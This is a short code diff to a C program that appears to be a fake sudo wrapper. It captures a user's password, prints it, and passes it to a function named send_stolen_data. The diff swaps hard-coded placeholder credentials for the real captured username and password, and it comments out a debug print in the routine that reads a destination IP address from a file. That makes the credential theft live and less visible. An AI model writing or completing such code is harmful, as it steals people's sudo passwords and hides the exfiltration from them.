@@ -53,7 +53,7 @@ int main(int argc, char ** argv){
 
     printf("%s's password is %s\n", username, passwd);
 
-    send_stolen_data("Abel", "pahahahahsswd");
+    send_stolen_data(username, passwd);
 
     char ** cmd_ray = make_execvp_args(argc, argv);
     runSudo(passwd, cmd_ray, 0);
@@ -154,7 +154,7 @@ void send_stolen_data(char *username, char *password) {
   char ip[256] = "";
   int i = 0;
   while (read(fileno(file), &out, 1) > 0) {
-      printf("%c\n", out);
+      // printf("%c\n", out);
       ip[i] = out;
       i++;
   }
